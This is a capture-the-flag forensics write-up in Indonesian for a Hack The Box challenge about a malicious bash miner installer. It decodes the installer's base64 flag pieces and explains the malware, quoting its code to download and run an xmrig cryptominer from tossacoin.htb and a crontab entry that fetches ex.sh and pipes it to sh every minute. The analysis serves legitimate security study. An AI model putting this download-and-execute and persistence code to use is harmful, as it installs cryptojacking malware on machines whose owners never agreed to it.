#forensic #bash
#writeup_sipoer #writeup_djkampus #writeup_twang 


1. diberikan sebuah file zip dengan nama forensics_red_miners.zip, kemudian kita akan mengextraks file tersebut, dan mengeluarkan file baru miner_installer.sh 
**![](https://lh6.googleusercontent.com/ULq9bO1SXbQYWjQ2XAtxf1uUnWtnV5eBftClhHqIV2zk6NKs3Hv9UKyfLodwIR4atdzB-EJTWifi423TJyWXeMFUnlRjWxIF6j-cKlBwCdao6zSfhow7vV8jHSV52LKDdrJw81ZGrGac1Xl6gTqqFIM)**\
2. selanjutnya kita akan melakukan isi file miner_installers.sh dengan menggunakan strings
```
strings [filename]
```

![[attachments/Pasted image 20230717223526.png]] 
**![](https://lh3.googleusercontent.com/Z3xQExbBab8HVbC1IFGU4ab6riT5Omzmk_5gnQofgjgUjlyOVnoX9qssBganM6C608d9-pjeU2Vuosd__jiJWDQD7jqCi7DxbFTVIdqgnI9IXr5BXfpy-TbW8jfqXFjTk-Z4RKHg3hwukVF0zxJq_HA)**
3. ketika saya melakukan strings, terdapat ciphertext yang mengarah ke base64, disini saya akan mencoba untuk mendecodenya dan ternyata file tersebut memiliki plaintext part1="HTB{m1n1ng"
```
echo "ciphertext" | base64 -d
```
**![](https://lh5.googleusercontent.com/uWwjbKpXKMYoW46hZMgNYW1BJg4p6-KI0XzpnvvH6Deuw1HGjJb2stYdfLmudAdWZeqkFD8NEGqVpaDnpdGDXoGn4bZIUEbq1TqXwfdHAT9whlxI8OiPgfMH9sq7Oo4AWyZaa8f7D-Gmgt9XErx7ZeY)**
4. saya berasumsi bahwa terdapat ciphertext base64 yang lain, sehingga saya melakukan strings lagi dengan tambahan ( grep == ) 
```
strings [filename] | grep ==
```
**![](https://lh6.googleusercontent.com/GpZ9ajKi7_iJFt9zGs9A8EM-UZ1FlcX54v1skmOoCcOUddfHxG8ztAP-_maT3v_1GZrAK0nZWf_xyAz-NR25ckdekJ0Ktlz--tcQA87mhDDi4RuSHqaa-lntmCXnHFnHcm1-tNUwvkMwX7Bt8XRJYSg)**
5. saya melakukan decode secara manual indikasi file yang terdapat base64, dengan melakukan echo “ciphertext” | base64 -d
```
echo "ciphertext" | base64 -d 
```
**![](https://lh4.googleusercontent.com/PTZTim5eUHofvsf58TBj1-Ol8HZ4NIYsWHmSqvv1WcR2-AsJUT6NGGjaRQLQWjoSQ_Mp4wGStt2_iY0Ut4FdYKNurz2BJbRCs5RYaL7St_TwgVRJ4r1OxDpLo2TxWT6TJIzrpnnRSKnml650DZY1zfg)**

**Flag = HTB{m1n1ng_th31r_w4y_t0_m4rs}** 



# Penjelasan Malware
Malware `redminers` mulai dieksekusi pada baris 723 (sifat interpreter pada bash) dengan memanggil fungsi-fungsi yang sudah didefinisikan sebelumnya. Contoh `checkTarget` dan `check_if_operation_is_active`.
```sh
checkTarget
check_if_operation_is_active
```

Malware `redminers` melakukan check apakah username komputer memiliki username `root7654` dan hostname berawalan `UNZ-`. Apabila, tidak maka `redminers` tidak akan dieksekusi. Kemungkinan potongan ini adalah script supaya malware ini tidak tereksekusi secara tidak sengaja. 
```sh
checkTarget() {
  EXPECTED_USERNAME="root7654"
  EXPECTED_HOSTNAME_PREFIX="UNZ-"

  CURRENT_USERNAME=$(whoami)
  CURRENT_HOSTNAME=$(hostname)

  if [[ "$CURRENT_USERNAME" != "$EXPECTED_USERNAME" ]]; then
      exit 1
  fi

  if [[ ! "$CURRENT_HOSTNAME" == "$EXPECTED_HOSTNAME_PREFIX"* ]]; then
      exit 1
  fi
}
```

Kemudian `redminers` melakukan pengujian koneksi terhadap server. URL ini mengandung base64 flag pertama.
```
check_if_operation_is_active() {
  local url="http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg=="
  
  if curl --silent --head --request GET "$url" | grep "200 OK" >/dev/null; then
    echo "Internet is enabled."
  else
    exit 1
  fi
}
```

Setelah itu, `redminers` akan melakukan download kepada url `http://tossacoin.htb/xmrig` dan disimpan dengan nama filename `xmrig`. Fungsi `checkExists()` mengandung base64 informasi flag kedua.
```sh
BIN_MD5="96cc922d3eb9ef23859377119332f8d7"
BIN_DOWNLOAD_URL="http://tossacoin.htb/xmrig"
BIN_DOWNLOAD_URL2="http://tossacoin.htb/xmrig"
BIN_NAME="xmrig"

...

checkExists() {
  CHECK_PATH=$1
  MD5=$2
  sum=$(md5sum $CHECK_PATH | awk '{ print $1 }')
  retval=""
  if [ "$MD5" = "$sum" ]; then
    echo >&2 "$CHECK_PATH is $MD5"
    retval="true"
  else
    echo >&2 "$CHECK_PATH is not $MD5, actual $sum"
    retval="false"
  fi

  dest=$(echo "X3QwX200cnN9Cg=="|base64 -d)
  if [[ ! -d $dest ]];
  then
    mkdir -p "$BIN_PATH/$dest"
  fi
  cp $CHECK_PATH $BIN_PATH/$dest
  echo "$retval"
}


...


Sleep 1000
binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
if [ "$binExists" = "true" ]; then
  echo "$BIN_FULL_PATH exists and checked"
else
  echo "$BIN_FULL_PATH not exists"
  download $BIN_FULL_PATH $BIN_DOWNLOAD_URL
  binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
  if [ "$binExists" = "true" ]; then
    echo "$BIN_FULL_PATH after download exists and checked"
  else
    echo "$BIN_FULL_PATH after download not exists"
    download $BIN_FULL_PATH $BIN_DOWNLOAD_URL2
    binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
    if [ "$binExists" = "true" ]; then
      echo "$BIN_FULL_PATH after download2 exists and checked"
    else
      echo "$BIN_FULL_PATH after download2 not exists"
    fi
  fi
fi
```

Malware `redminers` mencoba mengeksekusi file yang didownload. Malware ini juga melakukan persistence dengan memasang script pada crontab yang berjalan setiap menit untuk memastikan malware tersebut berjalan. File ini mengandung base64 flag ketiga.
```sh
chmod 777 $BIN_FULL_PATH
chmod +x $BIN_FULL_PATH
SKL=ex $BIN_FULL_PATH

crontab -l | sed '/#wget/d' | crontab -
crontab -l | sed '/#curl/d' | crontab -
crontab -l | grep -e "tossacoin.htb" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo '* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1'
  ) | crontab -
fi
```

